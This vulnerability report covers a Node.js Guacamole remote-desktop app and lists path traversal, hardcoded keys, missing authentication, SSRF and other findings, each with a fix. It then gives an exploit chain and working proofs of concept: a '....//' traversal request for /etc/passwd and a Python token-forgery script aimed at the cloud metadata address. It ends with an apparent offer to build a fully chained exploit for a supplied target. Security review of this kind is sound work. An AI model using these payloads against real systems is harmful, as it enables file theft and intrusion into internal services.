# Vulnerability Report

**Target:** `chips/` (Node.js/Express web application for remote desktop via Guacamole)
**Bug classes:** ALL
**Languages:** JavaScript (Node.js), EJS templates
**Date:** 2026-04-02

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High     | 4 |
| Medium   | 2 |
| Low / Info | 1 |

---

## Findings

### 1. Path Traversal via Bypass in File Download Route -- `path-traversal`

- **Severity:** High
- **Location:** `chips/routes/files.js:9-11`
- **Sink / pattern:** `path.join(__dirname, '../shared/' + fileName)` after insufficient `../` stripping

**Code (relevant excerpt):**

```js
router.get('/*', function(req, res, next) {
  let fileName = req.params["0"].split("../").join("")
  let filePath = path.join(__dirname, '../shared/' + fileName);
  res.download(filePath);
});
```

**Description:**
The sanitization splits on the literal string `../` and joins to remove it, but this is trivially bypassed. An attacker can use `....//` which, after removing the inner `../`, reassembles into `../`. For example, the request path `/files/....//....//....//etc/passwd` becomes `../../../etc/passwd` after the filter runs. This allows reading arbitrary files from the server filesystem.

**Remediation:**
Use `path.resolve` and verify the resulting path starts with the intended base directory (allowlist approach). For example:

```js
const base = path.resolve(__dirname, '../shared');
const resolved = path.resolve(base, fileName);
if (!resolved.startsWith(base + path.sep)) {
  return res.status(403).send('Forbidden');
}
res.download(resolved);
```

---

### 2. Hardcoded Encryption Key -- `hardcoded-secrets`

- **Severity:** High
- **Location:** `chips/settings/clientOptions.json:3`
- **Sink / pattern:** AES-256-CBC key as plaintext string in committed config file

**Code (relevant excerpt):**

```json
{
  "crypt": {
    "cypher": "AES-256-CBC",
    "key": "MySuperSecretKeyForParamsToken12"
  }
}
```

**Description:**
The encryption key used by `routes/token.js` to generate connection tokens is hardcoded in a config file committed to the repository. Anyone with access to the source can decrypt existing tokens or forge new ones with arbitrary RDP connection parameters (hostname, credentials, port). This completely undermines the token-based access control for Guacamole connections.

**Remediation:**
Load the encryption key from an environment variable or a secrets manager. Remove the hardcoded value from the repository and rotate the key.

---

### 3. Hardcoded RDP Credentials -- `hardcoded-secrets`

- **Severity:** Medium
- **Location:** `chips/settings/connectionOptions.json:6-7`
- **Sink / pattern:** Plaintext username and password in committed JSON config

**Code (relevant excerpt):**

```json
{
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": 3389,
      "security": "any",
      "ignore-cert": "true"
    }
  }
}
```

**Description:**
Default RDP credentials (`abc`/`abc`) are stored in plaintext in a committed configuration file. These are rendered into the HTML form as default values (visible in `index.ejs`), exposing them to any user who loads the page.

**Remediation:**
Move credentials to environment variables. Do not render default passwords into HTML form values.

---

### 4. No Authentication on Any Route -- `auth-bypass`

- **Severity:** High
- **Location:** `chips/app.js:30-34` (route registration), all route files
- **Sink / pattern:** Express routes with no auth middleware

**Code (relevant excerpt):**

```js
app.use('/', indexRouter);
app.use('/token', tokenRouter);
app.use('/rdp', rdpRouter);
app.use('/files', filesRouter);
```

**Description:**
The application registers all routes without any authentication or authorization middleware. Any unauthenticated user can: browse the home page (which exposes Docker container info and default RDP credentials), generate connection tokens via `POST /token`, initiate RDP sessions, and download files via `/files/*`. There is no session management, login, or access control of any kind.

**Remediation:**
Add authentication middleware (e.g., session-based login, API key, or OAuth) and apply it to all sensitive routes, at minimum `/token`, `/rdp`, and `/files`.

---

### 5. SSRF via User-Controlled RDP Hostname -- `ssrf`

- **Severity:** High
- **Location:** `chips/frontend/root.js:23-25`, `chips/routes/token.js:23-27`
- **Sink / pattern:** User-supplied `hostname` and `port` encrypted into token, used by GuacamoleLite to initiate server-side RDP connections

**Code (relevant excerpt):**

```js
// frontend/root.js - sends user form data to /token
let settings = defaultSettings
settings.connection.settings = value  // value comes from form inputs
axios.post('/token', settings, { maxRedirects: 0 })

// routes/token.js - encrypts the entire request body
router.post('/', function(req, res, next) {
  token = encrypt(req.body);
  res.json({"token": token});
});
```

**Description:**
The form on the index page allows users to specify an arbitrary `hostname` and `port` for the RDP connection. These values are encrypted into a token and passed to GuacamoleLite, which initiates a server-side TCP connection to the specified host. Combined with no authentication (Finding #4), any user can use the application as a proxy to scan or connect to arbitrary internal network hosts and ports via RDP.

**Remediation:**
Restrict allowed hostnames to an allowlist of known RDP targets. Do not allow users to specify arbitrary connection targets, or validate the hostname against a whitelist server-side before encrypting into the token.

---

### 6. Docker Socket Mounted into Container -- `command-injection`

- **Severity:** Critical
- **Location:** `chips/docker-compose.yml:10`, `chips/routes/index.js:5`
- **Sink / pattern:** `/var/run/docker.sock:/var/run/docker.sock` volume mount; `dockerode` usage in route

**Code (relevant excerpt):**

```yaml
# docker-compose.yml
services:
  chips:
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
```

```js
// routes/index.js
var docker = new Docker({socketPath: '/var/run/docker.sock'});
router.get('/', function(req, res, next) {
  docker.listContainers(function (err, containers) { ... });
});
```

**Description:**
The Docker socket is mounted into the application container, giving the application (and anyone who can execute code within it) full control over the Docker daemon on the host. The current code only lists containers, but the `dockerode` library exposes the full Docker API. If an attacker achieves code execution within the container (e.g., via a prototype pollution or dependency vulnerability), they can create privileged containers, mount the host filesystem, and achieve full host compromise. Even without code execution, the unauthenticated application leaks Docker container metadata (names, images, labels, status) via the index page.

**Remediation:**
Remove the Docker socket mount. If container information is needed, use a read-only Docker API proxy (e.g., Tecnativa/docker-socket-proxy) that exposes only the specific endpoints required, with authentication.

---

### 7. DOM-Based XSS in Guacamole Error Handler -- `xss`

- **Severity:** Medium
- **Location:** `chips/frontend/rdp.js:19-21`
- **Sink / pattern:** jQuery `.append()` with unsanitized `error.message` string

**Code (relevant excerpt):**

```js
guac.onerror = function(error) {
  display.style.cursor = 'default';
  $('#display').empty();
  $('#display').append(
    '<center><h1>Oh no! Something went wrong!</h1><br><p>'
    + error.message + '</p>');
};
```

**Description:**
When the Guacamole client encounters an error, the error message is inserted directly into the DOM via jQuery `.append()` without HTML encoding. If an attacker can influence the error message content (e.g., by controlling the WebSocket server response or via a crafted token that triggers a specific error string), they can inject arbitrary HTML and JavaScript into the page.

**Remediation:**
Use jQuery `.text()` for the error message portion instead of string concatenation into `.append()`:

```js
$('#display').append($('<center><h1>Oh no! Something went wrong!</h1><br>'));
$('#display').append($('<p>').text(error.message));
```

---

### 8. Insecure RDP Transport Configuration -- `weak-crypto`

- **Severity:** Low
- **Location:** `chips/settings/connectionOptions.json:9-10`
- **Sink / pattern:** `"security": "any"` and `"ignore-cert": "true"` in RDP connection defaults

**Code (relevant excerpt):**

```json
{
  "security": "any",
  "ignore-cert": "true"
}
```

**Description:**
The default RDP connection settings accept any security protocol (including unencrypted RDP) and skip TLS certificate validation. This makes the connection between the Guacamole server and the RDP target vulnerable to man-in-the-middle attacks, where an attacker on the network could intercept credentials and session data.

**Remediation:**
Set `"security": "nla"` (Network Level Authentication) or `"security": "tls"` and set `"ignore-cert": "false"`. Deploy valid certificates on RDP targets.

---

## Exploit chain

### Chain: Auth Bypass + Path Traversal -> Secret Exfiltration -> Token Forgery -> SSRF to Internal Network

- **Objective:** Access arbitrary internal hosts via forged RDP connections; exfiltrate files from the server.
- **Prerequisites:** Network access to the application (no authentication required).

**Flow:**

1. **Step 1** (`auth-bypass`, Finding #4): Attacker accesses the application without any authentication. The index page reveals Docker container metadata and default RDP credentials.

2. **Step 2** (`path-traversal`, Finding #1): Attacker requests `/files/....//....//....//usr/src/app/settings/clientOptions.json` to read the hardcoded encryption key. Can also read `/etc/passwd`, environment files, application source, or any file accessible to the Node.js process.

3. **Step 3** (`hardcoded-secrets`, Finding #2): Using the exfiltrated encryption key (`MySuperSecretKeyForParamsToken12`), the attacker can now decrypt any existing connection token or forge new tokens with arbitrary connection parameters.

4. **Step 4** (`ssrf`, Finding #5): Attacker forges a token specifying an internal hostname (e.g., `169.254.169.254` for cloud metadata, or internal service IPs) and port, then navigates to `/rdp?token=<forged>`. GuacamoleLite initiates a server-side connection to the target, allowing the attacker to reach internal services that are not directly accessible.

**Result:** Unauthenticated file read from the host filesystem, exfiltration of secrets, and SSRF to arbitrary internal network hosts via RDP. If the target environment runs on a cloud provider, this can lead to cloud metadata theft and further lateral movement.

**Feasibility:** Viable. Each step has been confirmed from the source code. The path traversal bypass (`....//`) is a well-known technique and the lack of authentication means no barriers to entry.

---

## Proof of concept (Critical / High only)

### PoC 1: Path Traversal -- File Read

A simple HTTP request demonstrates the path traversal bypass:

```
GET /files/....//....//....//etc/passwd HTTP/1.1
Host: <target>
```

The `....//` sequences bypass the `split("../").join("")` filter: after removing the inner `../`, each `....//` becomes `../`, resulting in `../../../etc/passwd`.

### PoC 2: Token Forgery

Using the hardcoded key from `clientOptions.json`, an attacker can generate tokens with arbitrary RDP targets:

```python
import json, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from os import urandom

KEY = b"MySuperSecretKeyForParamsToken12"
iv = urandom(16)

payload = {
    "connection": {
        "type": "rdp",
        "settings": {
            "hostname": "169.254.169.254",
            "port": "80",
            "security": "any",
            "ignore-cert": "true"
        }
    }
}

cipher = AES.new(KEY, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(json.dumps(payload).encode(), AES.block_size))

token_data = {"iv": base64.b64encode(iv).decode(), "value": base64.b64encode(encrypted).decode()}
token = base64.b64encode(json.dumps(token_data).encode()).decode()

print(f"Forged token: {token}")
print(f"Use: http://<target>/rdp?token={token}")
```

To build a fully functional PoC script that chains the path traversal with token forgery and SSRF, provide the target base URL and we can iterate on it together.
